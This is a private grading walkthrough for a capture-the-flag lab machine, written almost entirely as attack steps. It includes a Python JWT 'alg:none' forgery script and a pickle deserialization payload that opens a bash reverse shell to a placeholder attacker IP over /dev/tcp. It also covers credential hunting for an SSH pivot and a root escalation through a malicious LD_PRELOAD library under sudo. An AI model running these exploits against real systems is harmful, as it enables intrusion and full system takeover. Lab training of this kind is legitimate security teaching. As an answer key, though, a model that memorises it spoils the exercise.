# Solution Walkthrough (private - for grading reference only)

## Stage 0: Recon
```
nmap -p- -T4 <VM_IP>
```
A default top-1000 scan misses the app; the full `-p-` scan reveals it on
port `58421` (mapped from the container's internal port 5000), plus SSH on 22.

## Stage 1: JWT alg:none forgery
1. Log in as the low-priv seed account to see a legitimate token shape:
   ```
   curl -X POST http://<ip>:58421/api/login \
     -H "Content-Type: application/json" \
     -d '{"username":"operator","password":"L3tM31nPlz!"}'
   ```
2. Decode the returned JWT (header/payload are base64, no crypto needed to
   read them) to see the structure: `{"sub":"operator","role":"user",...}`.
3. Forge a new token with `"alg":"none"`, role `admin`, and an empty
   signature segment:
   ```python
   import base64, json

   def b64url(d: bytes) -> str:
       return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

   header = {"alg": "none", "typ": "JWT"}
   payload = {"sub": "operator", "role": "admin", "iat": 1234567890}
   token = f"{b64url(json.dumps(header).encode())}.{b64url(json.dumps(payload).encode())}."
   print(token)
   ```
4. Confirm admin access:
   ```
   curl http://<ip>:58421/api/profile -H "Authorization: Bearer <forged token>"
   ```

## Stage 2: Pickle RCE
With the forged admin token, send a malicious pickle to `/admin/debug`:
```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# POST {"report": payload} to /admin/debug with the forged Bearer token
```
Catch the reverse shell with `nc -lvnp 4444`. You now have a shell inside
the `internalops` container as root (of the container).

## Stage 3: Find the pivot creds
```
cat /opt/app/.internal/host_access.txt
```
Reveals `user2` / the SSH password for the actual VM host (not the
container). SSH to the host's real IP as `user2`.

## Stage 4: Privesc via sudo env_keep LD_PRELOAD
```
sudo -l
```
Shows:
```
Defaults:user2 env_keep += "LD_PRELOAD"
User user2 may run the following commands:
    (root) NOPASSWD: /usr/local/sbin/logcheck
```
Build a malicious shared library whose constructor runs as root when
loaded into any dynamically-linked process `sudo` executes:
```c
// evil.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```
```
gcc -shared -fPIC -nostartfiles -o /tmp/evil.so /tmp/evil.c
sudo LD_PRELOAD=/tmp/evil.so /usr/local/sbin/logcheck
```
Since `env_keep` preserves `LD_PRELOAD` through `sudo`, and `logcheck`
(and/or the `bash`/`tail` it spawns) is a normal dynamically-linked
binary, the loader pulls in `evil.so` and its constructor runs with
root privileges before `logcheck` itself even executes -> root shell.

## Flags
- `/home/user2/user.txt` - obtained after Stage 3 (SSH pivot)
- `/root/root.txt` - obtained after Stage 4 (privesc)

## Skills this exercises
1. Full-range port scanning discipline
2. JWT structure understanding + algorithm-confusion vulnerability
3. Insecure deserialization (Python `pickle`) -> RCE
4. Container-vs-host awareness; credential hunting after initial foothold
5. Real-world `sudo`/`env_keep` misconfiguration + shared-library injection
